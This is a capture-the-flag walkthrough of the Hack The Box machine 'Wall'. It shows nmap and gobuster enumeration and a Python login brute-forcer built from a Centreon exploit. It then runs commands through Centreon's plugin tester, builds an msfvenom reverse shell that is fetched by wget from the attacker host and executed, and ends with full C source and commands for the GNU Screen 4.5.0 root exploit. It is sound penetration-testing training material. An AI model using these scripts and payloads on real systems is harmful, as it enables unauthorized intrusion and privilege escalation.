---
author: bhero
topic: htb
---
Walkthrough for Wall : 10.10.10.157

Breaking barriers with customising exploits. 

## Enumeration

Old habits die hard, first we assign the ip addresses to a local variables:
 
``` bash
WALL=10.10.10.157
ATTACK=10.10.14.37
```

First we run the nmap scan (avoiding the ping) to identify the running services:
 
``` bash
nmap $WALL -Pn
```

This returns ssh and http:

``` bash
Nmap scan report for 10.10.10.157
Host is up (0.027s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Ignoring ssh for now as it is  a difficult vector to attack I focus on http enumertaion with:

``` bash
nmap $WALL -Pn --script=http-enum
```

but quickly get the same results back.
with no quick wins, I decide to poke the site with curl to find out what we have:

``` bash
curl -ik $WALL 
```

which returns the standard apache front page:

``` html
HTTP/1.1 200 OK
Date: Sun, 24 Nov 2019 14:04:10 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Tue, 02 Jul 2019 11:27:35 GMT
ETag: "2aa6-58cb1080cb0d2"
Accept-Ranges: bytes
Content-Length: 10918
Vary: Accept-Encoding
Content-Type: text/html


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2016-11-16
    See: https://launchpad.net/bugs/1288690
  -->
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Apache2 Ubuntu Default Page: It works</title>
    <style type="text/css" media="screen">

<!-- rest of page -->
```

I decide to pull out gobuster to perform a directory listing brute force:

``` bash
gobuster dir -u $WALL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

After a few minutes the scan finishes with the following results:

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.157
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/11/24 14:14:41 Starting gobuster
===============================================================
/monitoring (Status: 401)
/server-status (Status: 403)
===============================================================
2019/11/24 14:25:25 Finished
===============================================================
```

I have 2 new locations to prod, `/monitoring` and `/server-status`.

A 401 is typically used for missing or bad authentication an means I have failed an identity check. A 403 response means that my curent identy is forbidden to access this resource and is a failure in authorization.

I try the unauthorised response first, because in order to bypass a 403 I need to bypass access controls. A 401 may have a way to provide or coax the authentication mechanism out of it.

``` bash
curl -ik $WALL/monitoring
```

``` html
HTTP/1.1 401 Unauthorized
Date: Sun, 24 Nov 2019 14:20:15 GMT
Server: Apache/2.4.29 (Ubuntu)
WWW-Authenticate: Basic realm="Protected area by the admin"
Content-Length: 459
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.10.10.157 Port 80</address>
</body></html>
```

I don't get a login prompt, unusual for a web page but not entirely unexpected from an API. When we authenticate against an API we typically do so from a POST, curl uses a GET call by default to call out to the resources. 

I try again with a POST request:

``` bash
curl -ik $WALL/server-status
```

This time I get back a re-direct message:

``` html
HTTP/1.1 301 Moved Permanently
Date: Sun, 24 Nov 2019 14:35:56 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: http://10.10.10.157/monitoring/
Content-Length: 317
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://10.10.10.157/monitoring/">here</a>.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.10.10.157 Port 80</address>
</body></html>
```

Which I follow:

``` bash
curl -ikL -X POST $WALL/monitoring
```

to get an under construction message with a `<meta http-equiv="refresh" content="0; URL='/centreon'" />` tag:

``` html
HTTP/1.1 301 Moved Permanently
Date: Sun, 24 Nov 2019 14:37:29 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: http://10.10.10.157/monitoring/
Content-Length: 317
Content-Type: text/html; charset=iso-8859-1

HTTP/1.1 200 OK
Date: Sun, 24 Nov 2019 14:37:29 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Wed, 03 Jul 2019 22:47:23 GMT
ETag: "9a-58ccea50ba4c6"
Accept-Ranges: bytes
Content-Length: 154
Vary: Accept-Encoding
Content-Type: text/html

<h1>This page is not ready yet !</h1>
<h2>We should redirect you to the required page !</h2>

<meta http-equiv="refresh" content="0; URL='/centreon'" />
```

Effectively this code would move move my request to `http://10.10.10.157/centreon`

A quick curl:

``` bash
curl -ikL $WALL/centreon
```

Returns a redirected 200 response with a lot of code so at this point I decide to pull in the browser and visit the site to find __Centreon Network Manger v.19.04.0__

![centreon.png](/assets/htb_stuff/wall/centreon.png)

## Triage


Having found an app, I start looking for known exploits:
``` bash
searchsploit centreon 19
```

I spot an RCE for our application in 47069.py

```
------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                 |  Path
                                                                               | (/usr/share/exploitdb/)
------------------------------------------------------------------------------- ----------------------------------------
Centreon 19.04  - Remote Code Execution                                        | exploits/php/webapps/47069.py
Centreon IT & Network Monitoring 2.1.5 - SQL Injection                         | exploits/php/webapps/11979.pl
------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

and check it out:

``` bash
searchsploit -x 47069
```

Immediatly disheartened as the first comment says:

> `# Exploit Title: Centreon v19.04 authenticated Remote Code Execution`

Meaning I need a username and password.

Additionally the line:

``` python
token = soup.findAll('input')[3].get("value")
```

Also suggests there is a dynamic login token required. If true a conventional brute force via hydra will be difficult.

I review the source code on the original request to find the token on line 43 and compare with a a refreshed version of the site:

![tokens.png](/assets/htb_stuff/wall/tokens.png)

It does look like the token changes. I try the googled default credentials of `admin:centreon` but they do not work:

![nope.png](/assets/htb_stuff/wall/nope.png)

After some research on the app and the exploit I decide to to try a brute force attack on the website.

My Hydra game isn't strong enough to craft the attack and I don't want to pull out Zap/Burp unless I have to. I copy the original exploit to my working directory to re-work it as a brute force tool.

``` bash
searchsploit -m 47069
```

I rework the code to the following:

``` python
import requests
import sys
import warnings
from bs4 import BeautifulSoup

# turn off BeautifulSoup warnings
warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
url = 'http://10.10.10.157/centreon'
username = 'admin'
pass_file = 'xato-net-10-million-passwords-1000.txt'

def get_passwords(pass_file=pass_file):
    return [line.rstrip('\n') for line in open(pass_file)] # watch the newline!

def login_attempt(password, username=username):
    request = requests.session()
    print("[+] Retrieving CSRF token to submit the login form")
    page = request.get(url+"/index.php")
    html_content = page.text
    soup = BeautifulSoup(html_content)
    token = soup.findAll('input')[3].get("value")

    login_info = {
        "useralias": username,
        "password": password,
        "submitLogin": "Connect",
        "centreon_token": token
    }
    login_request = request.post(url+"/index.php", login_info)
    print("[+] U: {0} P: {1} T: {2}".format(username,password,token))
    if "Your credentials are incorrect" not in login_request.text:
        print("[+] Logged In Sucssfully")
        exit()
    else:
        print("[-] Wrong credentials")

passwords = get_passwords()
for password in passwords:
    login_attempt(password=password)
```


Taking the `xato-net-10-million-passwords-1000.txt` wordlist from the OWASP SecLists [repo](https://github.com/danielmiessler/SecLists.git)

I eventually get the login admin:password1

```
[+] Retrieving CSRF token to submit the login form
[+] U: admin P: password1 T: 2a1e5c6f3af68a3962a4cbea435cb8ad
[+] Logged In Sucssfully
```

I check it works by logging in:

![im_in.png](/assets/htb_stuff/wall/im_in.png)
 
## Exploit

With the access credentials I set up a listener on port 443 with:

``` bash
sudo nc -nvlp 443
```

and try the exploit:

``` bash
python3 47069.py http://$WALL/centreon admin password1 $ATTACK 443
```

But get nothing back.

I decide to research the vulnerability some more to try and understand what is going on, the write up [here](https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/) goes into some good detail about how the author worked out the exploit.

In order to better understand the issue I even visited the CVE [page](https://www.cvedetails.com/cve/CVE-2019-13024/) for CVE-2019-13024.

The gist of the exploit is that it trys to inject code into the poller configuration page based at is url: `/main.get.php?p=60901`

After some poking around the system I could see where the poller options were on the menu but could not figure out why the code was not executing.

I began to suspect some form of whitelisting when I noticed the Command option in the menu. I decided to look into this a bit and began to get hopeful when I noticed the option to add a new one.

Taking me to http://10.10.10.157/centreon/main.php?p=60801&o=a&type=2 I examined my options only to discover there was an option to "Test the plugin" for custom command scripts in the form of a blur Play icon.

![command.png](/assets/htb_stuff/wall/command.png)

I couldn't believe my luck, if it worked this looked like an easy way to execute code on the machine. Tying in from my research a number of functions used php shell_exec, popen, system commands. If this plugin leveraged any of these, in theory I could execute code from here. 

I tied the classic exploit PoC command:

``` bash
cat /etc/passwd
```

![passwd.png](/assets/htb_stuff/wall/passwd.png)

And hit the play icon to prove code execution.

![poc.png](/assets/htb_stuff/wall/poc.png)

From here I tried a few different techniques to pop a shell, but many of the commands returned with warnings/failed executions.

My suspicions of a whitelist grew and I decided to make  custom payload with msfvenom.
First I needed to determine the arch of Wall:

``` bash
uname -a
```

Showed me x86_64, the same as my attacking system:

```
Linux Wall 4.15.0-54-generic #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

I decided to make an x64 reverse shell with msfvenom on my kali with:

``` bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ATTACK LPORT=443 -f elf > shell443.elf
```

Giving me a nice compact linux binary that matches Wall's arch:

```
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

In my working on a new terminal directory I spawn a debugging HTTP server in python with:

``` bash
sudo python -m SimpleHTTPServer 80
```

and in the Centreon app I try to pull it over with:

``` bash
wget http://10.10.14.37/shell443.elf
```

I see a 200 on my attacking system:

```
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.157 - - [24/Nov/2019 16:43:59] "GET /shell443.elf HTTP/1.1" 200 -
```

and an OK on the plugin test.

![wget.png](/assets/htb_stuff/wall/wget.png)

I run the following commands individually to turn my binary open and executable to the world, then trigger a shell back to my system:

``` bash
chmod 777 shell443.elf
./shell443.elf
``` 

And I have an RCE shell:

```
listening on [any] 443 ...
connect to [10.10.14.37] from (UNKNOWN) [10.10.10.157] 40136
```

## Priv Escalation

Weirdly I was unable to get the user flag from this. First thing first I run my playbook to get as close to a full shell as I can:

``` bash
python -c 'import pty; pty.spawn("/bin/bash")'
# Background with Ctrl ^Z to get the bellow output
# [1]+  Stopped                 sudo nc -nvlp 443
# command below stops typing being visible
stty raw -echo
# then we restart our process
fg
```

Now we can use our existing terminal's special keys and suck on the reverse shell, a must if we need to use Vim.

I follow the standard HTB enumeration playbook by fetching and running LinEum

``` bash
wget http://10.10.14.37/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh > enum152hf9ufioje3bbrvdsc93masp.txt
```

This takes a couple of moments to run but creates a nice file for me to be able to view in the browser here: `http://10.10.10.157/centreon/enum152hf9ufioje3bbrvdsc93masp.txt`

Initially everything looks pretty standard until I get to the SUID files:

```
[00;31m[-] SUID files:[00m
-rwsr-xr-x 1 root root 43088 Oct 15  2018 /bin/mount
-rwsr-xr-x 1 root root 64424 Mar 10  2017 /bin/ping
-rwsr-xr-x 1 root root 1595624 Jul  4 00:25 /bin/screen-4.5.0
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 26696 Oct 15  2018 /bin/umount
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
```

`/bin/screen-4.5.0` is not a binary I am familar with, so I google it.

My first hit is from the exploit-db, exploit [41154](https://www.exploit-db.com/exploits/41154) - GNU Screen 4.5.0 - Local Privilege Escalation.

I read through the exploit and understand that this is an SUID hijack that creates a binary that will allow a swich user priveleges to root.

I've never had much success with compilation scripts running natively on victim boxes and because I know my arch matches Wall's I decide to manually create the C requirments locally and then ship them over.

On my Kali in my working directory I create 2 files:

rootshell.c

``` C
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

and libhax.c

``` C
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

I then follow the script with some modifications to generate my evil code:

``` bash
gcc -fPIC -shared -ldl -o libhax.so libhax.c
gcc -o rootshell rootshell.c
```

I get some C related warnings, but the code compiles ok.
Now I have an evil lib and executable.

Next I go back to my shell, move to /tmp and copy the files over

``` bash
cd /tmp && wget http://10.10.14.37/rootshell
wget http://10.10.14.37/libhax.so
```

I make them open and executable to the world, because if they fail it might break my shell.

``` bash
chmod 777 rootshell && chmod 777 libhax.so
```

I hen follow the rest of the script:

``` bash
cd /etc
umask 000
screen-4.5.0 -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
screen-4.5.0 -ls 
/tmp/rootshell 
```

To get a root shell:

``` bash
id
uid=0(root) gid=0(root) groups=0(root),33(www-data),6000(centreon)
```

W00t!W00t! Get the keys with:

``` bash
cat /home/shelby/user.txt
cat /root/root.txt
```

## Bonus

Get gobuster

``` bash
sudo apt install gobuster
```

Get the the OWASP SecLists

```
git clone https://github.com/danielmiessler/SecLists.git
```